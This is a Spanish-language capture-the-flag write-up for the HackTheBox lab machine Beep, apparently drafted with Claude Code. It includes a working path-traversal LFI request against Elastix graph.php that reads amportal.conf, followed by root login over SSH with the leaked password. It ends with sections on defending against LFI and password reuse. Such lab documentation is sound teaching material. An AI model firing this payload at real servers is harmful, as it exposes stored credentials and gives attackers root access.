---
title: Beep (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, linux, lfi, elastix, pbx, reutilizacion-credenciales, escalada-privilegios]
type: nota
status: en-progreso
source: claude-code
aliases: [HTB Beep, Beep HTB, beep hackthebox]
---

# Beep — HackTheBox (Easy)

SO: Linux · Dificultad: Easy · Skills: Recon multi-puerto, LFI en aplicacion web, extraccion de credenciales de config, reutilizacion de contrasenas, acceso SSH directo como root

Beep es famosa en la comunidad HTB por tener **multiples caminos validos** hacia root, todos partiendo de un servidor Elastix PBX (central telefonica VoIP) mal configurado y sin parchear. La via aqui documentada es la mas didactica: LFI que filtra credenciales + reutilizacion de password. El salto clave es que foothold y escalada de privilegios colapsan en un solo paso: las credenciales filtradas ya pertenecen a root.

> HTB es un laboratorio de hacking etico 100% legal y autorizado. Toda la actividad descrita ocurre dentro de su entorno controlado.

---

## Objetivo

Obtener las flags de usuario (`user.txt`) y de root (`root.txt`) comprometiendo el servidor Elastix PBX explotando un LFI que filtra credenciales, combinado con reutilizacion de contrasenas entre la aplicacion y SSH.

---

## Acceso a la maquina (paso previo)

1. Descarga tu perfil OpenVPN desde la web de HTB (seccion *Access*) y conectate:

```bash
sudo openvpn lab_<tu_usuario>.ovpn
```

Deja esta terminal abierta durante toda la sesion — si la cierras, pierdes el tunel.

2. En la web de HTB, ve a *Labs → Machines*, busca **Beep** (maquina retirada) y pulsa *Spawn Machine*. Tras unos segundos aparecera una IP de la forma `10.10.10.x`.

3. Verifica conectividad:

```bash
ping -c2 <IP>
```

4. Sustituye `<IP>` por la IP que HTB te haya asignado en todos los comandos siguientes (es dinamica, cambia cada vez que lanzas la maquina).

> Las maquinas retiradas como Beep requieren suscripcion **VIP**. Si usas el Pwnbox (Kali en el navegador de HTB), ya viene conectado a la VPN — no necesitas el paso 1.

---

## Reconocimiento

Categoria: **escaneo de puertos + identificacion de servicio**

Nmap con deteccion de version y scripts estandar. Beep expone una superficie de ataque inusualmente grande para una maquina Easy:

```bash
nmap -sV -sC -oN beep_nmap.txt <IP>
```

Puertos relevantes que aparecen (puede variar ligeramente segun la version de nmap):

| Puerto | Servicio | Notas |
|--------|----------|-------|
| 22/tcp | SSH | OpenSSH |
| 25/tcp | SMTP | Postfix |
| 80/tcp | HTTP | Redirige a 443 |
| 110/tcp | POP3 | Dovecot |
| 111/tcp | rpcbind | |
| 143/tcp | IMAP | Dovecot |
| 443/tcp | HTTPS | **Elastix PBX** (login web) |
| 878/tcp | status | rpcbind |
| 993/tcp | imaps | |
| 995/tcp | pop3s | |
| 3306/tcp | MySQL | |
| 4190/tcp | sieve | |
| 4445/tcp | upnotifyp | |
| 4559/tcp | hylafax | |
| 5038/tcp | Asterisk AMI | Control VoIP |
| 10000/tcp | HTTP | **Webmin** |

Impresion clave: el servidor es una instalacion tipica de **Elastix** (distribucion Linux que integra Asterisk, FreePBX, HylaFAX, Postfix y Webmin). Cada uno de esos servicios es un vector de ataque potencial — de ahi los multiples caminos.

---

## Enumeracion

Categoria: **inspeccion de aplicacion web + busqueda de vulnerabilidades conocidas**

Navega a `https://<IP>/` (acepta el certificado autofirmado). Aparece el panel de login de **Elastix**.

Identifica la version de Elastix en el pie de pagina o en las cabeceras HTTP. Busca vulnerabilidades conocidas:

```bash
searchsploit elastix
```

Resultados relevantes:

```
Elastix 2.2.0 - 'graph.php' Local File Inclusion          # EDB-ID 37637
Elastix < 2.5 - PHP Code Injection                         # EDB-ID 38091
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution    # EDB-ID 18650
```

La via mas limpia y didactica es el **LFI en `graph.php`** (EDB-ID 37637, relacionado con CVE-2012-4869 y el modulo vtigercrm).

---

## Acceso inicial (foothold)

Categoria: **LFI (Local File Inclusion) → filtracion de credenciales → reutilizacion de password → SSH como root**

### Paso 1 — Explotar el LFI en graph.php

El parametro `current_language` en `graph.php` no sanitiza la entrada, permitiendo recorrer el sistema de ficheros del servidor (path traversal). El archivo mas valioso que se puede filtrar es `amportal.conf`, que contiene las credenciales de administracion de FreePBX/Asterisk en texto plano:

```bash
curl -k "https://<IP>/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action"
```

> El `%00` es un null-byte que en versiones antiguas de PHP trunca la extension `.php` que el codigo anade al final del path. Dependiendo de la version exacta instalada, puede que no sea necesario — prueba con y sin el null-byte si uno no funciona.

La respuesta incluira el contenido de `amportal.conf`. Busca las lineas:

```
AMPDBPASS=<contrasena_db>
AMPMGRPASS=<contrasena_manager>
```

Anota la contrasena que aparezca — suele ser la misma en varios campos del fichero.

### Paso 2 — Reutilizacion de credenciales via SSH

Categoria: **credential stuffing / password reuse**

El patron critico: la contrasena encontrada en `amportal.conf` esta **reutilizada** para el usuario `root` del sistema operativo. Prueba directamente:

```bash
ssh root@<IP>
```

SSH pedira la contrasena — introduce la que extrajiste de `amportal.conf`. Si funciona, tienes shell de root **sin necesidad de escalar privilegios**: foothold y escalada colapsan en un solo paso.

> Si SSH da error de algoritmo de clave (maquinas antiguas usan algoritmos deprecados), usa:
> ```bash
> ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@<IP>
> ```

---

## Escalada de privilegios

En esta maquina, con la via del LFI, **no hay escalada separada**: las credenciales filtradas ya son de `root`. Aterrizas directamente en una shell con UID 0.

Si hubieras llegado por otra via (por ejemplo, shell web como `asterisk`), la escalada tipica seria:

- **Webmin RCE** (puerto 10000): Webmin 1.570 tiene ejecucion remota de comandos autenticada (CVE-2012-2982 / EDB-ID 17492). Con las credenciales de `amportal.conf` puedes autenticarte en Webmin y ejecutar comandos como root.
- **Sudo misconfiguracion**: el usuario `asterisk` puede tener entradas en `/etc/sudoers` que permitan ejecutar binarios como root sin password.

Estas vias alternativas se mencionan porque ilustran el concepto de **multiples caminos a la misma cima** — una caracteristica pedagogica de Beep.

---

## Flags

Una vez con shell de root:

```bash
# Flag de usuario (en el home del usuario fanis, habitualmente)
cat /home/fanis/user.txt
# <flag>

# Flag de root
cat /root/root.txt
# <flag>
```

Localización esperada: `user.txt` en `/home/fanis/user.txt` · `root.txt` en `/root/root.txt`.

---

## Patron y teoria

Esta es la seccion mas importante del writeup. Beep encapsula dos patrones de ataque que aparecen constantemente en entornos reales.

### Patron 1 — LFI como vector de exfiltracion de secretos

**Categoria**: [[08-vulnerabilidades-y-explotacion]] > Inyeccion de path / LFI

**Schema**:
1. Aplicacion web acepta un nombre de fichero o ruta como parametro GET/POST
2. No valida ni sanitiza la entrada (ni lista blanca, ni neutralizacion de `../`)
3. El atacante recorre el sistema de ficheros y lee archivos sensibles (`/etc/passwd`, ficheros de config con credenciales)

**Por que importa para un desarrollador/defensor**:
- Un LFI no es solo "ver ficheros" — es la llave que abre el siguiente paso (credenciales, claves SSH, tokens). El impacto real depende de lo que haya en el sistema de ficheros, no del bug en si.
- Ficheros especialmente peligrosos en Linux: `/etc/passwd`, `/etc/shadow` (si hay permisos), archivos `.conf` de la aplicacion, `.env`, `wp-config.php`, `amportal.conf`, claves privadas SSH en `~/.ssh/`.

**Como se defiende**:
- Nunca construyas rutas de fichero concatenando input del usuario directamente.
- Usa listas blancas de ficheros permitidos o IDs numericos que mapeen a rutas internas.
- Ejecuta la aplicacion con el usuario de minimos privilegios — si el proceso web no puede leer `/etc/amportal.conf`, el LFI no filtra nada util.
- Desactiva `allow_url_include` y considera `open_basedir` en PHP para restringir el sistema de ficheros accesible.

### Patron 2 — Reutilizacion de credenciales (credential reuse)

**Categoria**: [[05-identidad-auth-y-secretos]] > Gestion de secretos / Reutilizacion de password

**Schema**:
1. Credencial generada/almacenada para un servicio (base de datos, API, aplicacion)
2. La misma credencial se usa para otro servicio (SSH, Webmin, cuenta OS)
3. El atacante que comprometio el primer servicio accede automaticamente a todos los demas

**Por que importa**: este patron es responsable de una fraccion enorme de brechas reales. En Beep, una sola contrasena en texto plano en un fichero de config da acceso root directo al sistema operativo. No hay escalada: el atacante pasa de "leer un fichero" a "dueno del servidor" en un comando.

**Como se defiende**:
- **Una credencial, un servicio**: nunca reutilices la misma contrasena entre la capa de aplicacion, la base de datos y el sistema operativo.
- Usa un gestor de secretos (HashiCorp Vault, AWS Secrets Manager, etc.) en vez de ficheros `.conf` en disco.
- Cifra los ficheros de configuracion sensibles y restringe permisos de lectura al usuario de servicio exacto (`chmod 600`, propietario del proceso).
- Aplica autenticacion por clave publica en SSH y desactiva el login por password (`PasswordAuthentication no` en `sshd_config`).

### Patron 3 — Multiples caminos a la misma cima

**Concepto pedagogico**: Beep es famosa por tener al menos 5-6 vias distintas hacia root (LFI + reuse, Shellshock en el CGI de Asterisk, RCE en FreePBX, Webmin RCE, exploit directo de Elastix). Esto ilustra que una superficie de ataque amplia (muchos servicios expuestos, muchos paquetes sin parchear) no necesita tener un unico fallo critico — basta con que *alguno* de los vectores funcione.

**Leccion de diseno**: la defensa en profundidad (segmentacion de red, principio de minimo privilegio, parcheo sistematico) no puede depender de "este servicio concreto es seguro". Hay que reducir la superficie total.

### Resumen del flujo de ataque

```
Recon (nmap, muchos puertos)
  └─> Identificar Elastix en 443
        └─> LFI en graph.php (CVE-2012-4869 / EDB-ID 37637)
              └─> Leer amportal.conf → credencial en texto plano
                    └─> SSH root@<IP> con esa credencial
                          └─> root shell (user.txt + root.txt)
```

---

## Conexiones

- [[HTB_Easy/00_README]] — indice de todas las maquinas Easy documentadas
- [[MOC_Ciberseguridad]] — mapa de contenido de ciberseguridad
- [[HTB_Starting_Point/00_README]] — paso anterior: maquinas de Starting Point (escalon previo a Easy)
- [[12-aprender-y-carrera]] — ruta de aprendizaje y objetivos de carrera
- [[05-identidad-auth-y-secretos]] — gestion de credenciales, secretos, autenticacion
- [[08-vulnerabilidades-y-explotacion]] — taxonomia de vulnerabilidades web y de sistema

## Fuente

Writeup elaborado con Claude Code (2026-06-15) basado en la solucion estandar documentada en writeups oficiales de HTB y videos de IppSec. Los comandos exactos pueden requerir ajuste segun la instancia especifica de la maquina (algoritmos SSH deprecados, version de PHP que acepta o no el null-byte). Verificar siempre contra la maquina en vivo.
